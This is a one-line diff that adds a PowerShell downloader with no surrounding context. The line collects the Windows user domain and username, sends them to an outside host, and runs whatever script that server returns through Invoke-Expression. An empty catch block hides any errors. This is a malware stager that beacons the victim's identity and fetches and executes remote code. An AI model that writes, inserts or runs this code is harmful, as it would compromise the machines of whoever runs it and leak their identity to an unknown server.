@@ -1,0 +1,1 @@
+try{$ud = $env:userdomain;$un = $env:username;iex((New-Object System.Net.WebClient).DownloadString('https://nid.elementfx.com/indown.php?clicked='+ $ud +'&who='+$un+'&what=xxx'));}catch{}
